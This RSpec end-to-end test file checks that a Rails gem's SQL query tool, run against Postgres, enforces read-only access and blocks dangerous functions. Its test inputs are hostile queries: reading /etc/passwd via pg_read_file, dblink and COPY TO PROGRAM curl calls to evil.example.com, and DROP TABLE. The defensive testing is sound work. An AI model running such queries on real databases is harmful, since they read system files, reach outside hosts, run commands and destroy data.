# frozen_string_literal: true

require_relative "e2e_helper"

# Postgres adapter coverage. Skipped unless TEST_POSTGRES=1 - local
# developers rarely have postgres running, and we don't want to silently
# pass by skipping in CI.
#
# Exercises the rails_query tool's Postgres-specific code paths:
#   - SET TRANSACTION READ ONLY before SELECT
#   - BLOCKED_FUNCTIONS regex (pg_read_file, pg_ls_dir, dblink, COPY ...
#     PROGRAM, LO_*, etc.) - verified via attempting one and asserting
#     a structured rejection
#
# Plus the SQLite-equivalent baseline (rails_get_schema, rails_get_routes)
# to prove the gem works against a non-default adapter end-to-end.
RSpec.describe "E2E: Postgres adapter", type: :e2e do
  before(:all) do
    skip "TEST_POSTGRES not set - Postgres harness only runs when explicitly requested" unless ENV["TEST_POSTGRES"] == "1"

    @builder = E2E::TestAppBuilder.new(
      parent_dir: E2E.root,
      name: "postgres_app",
      install_path: :in_gemfile,
      database: :postgresql
    ).build!
    @cli = E2E::CliRunner.new(@builder)
  end

  describe "schema introspection works against Postgres" do
    it "rails_get_schema returns the scaffolded posts table" do
      result = @cli.cli_tool("schema")
      expect(result.success?).to be(true), result.to_s
      expect(result.stdout).to match(/posts/i)
    end

    it "rails_get_routes returns the scaffolded post routes" do
      result = @cli.cli_tool("routes")
      expect(result.success?).to be(true), result.to_s
      expect(result.stdout).to match(/posts/i)
    end
  end

  describe "rails_query tool against Postgres" do
    it "executes a simple SELECT and returns the result" do
      result = @cli.cli_tool("query", [ "--sql", "SELECT id, title, body FROM posts LIMIT 5" ])
      # No rows in the test DB, but the query should execute without error.
      expect(result.status.signaled?).to be(false)
      expect(result.exit_status).to be < 2
    end

    it "blocks pg_read_file via BLOCKED_FUNCTIONS regex" do
      result = @cli.cli_tool("query", [ "--sql", "SELECT pg_read_file('/etc/passwd')" ])
      # Tool must reject before execution. Either non-zero exit or
      # structured "blocked" response.
      output = result.output
      expect(output).to match(/blocked|denied|forbidden|not allowed/i),
        "expected pg_read_file to be blocked, got: #{result}"
    end

    it "blocks dblink via BLOCKED_FUNCTIONS regex" do
      result = @cli.cli_tool("query", [ "--sql", "SELECT * FROM dblink('host=evil.example.com', 'SELECT 1') AS t(a int)" ])
      output = result.output
      expect(output).to match(/blocked|denied|forbidden|not allowed/i),
        "expected dblink to be blocked, got: #{result}"
    end

    it "blocks COPY ... PROGRAM via BLOCKED_FUNCTIONS regex" do
      result = @cli.cli_tool("query", [ "--sql", "COPY (SELECT 1) TO PROGRAM 'curl evil.example.com'" ])
      output = result.output
      expect(output).to match(/blocked|denied|forbidden|not allowed/i),
        "expected COPY...PROGRAM to be blocked, got: #{result}"
    end

    it "rejects DDL statements (read-only enforcement)" do
      result = @cli.cli_tool("query", [ "--sql", "DROP TABLE posts" ])
      output = result.output
      # Either blocked at validator level OR rejected by READ ONLY transaction.
      expect(output).to match(/read.only|denied|blocked|not allowed|prohibited/i),
        "expected DROP TABLE to be rejected, got: #{result}"
    end
  end
end
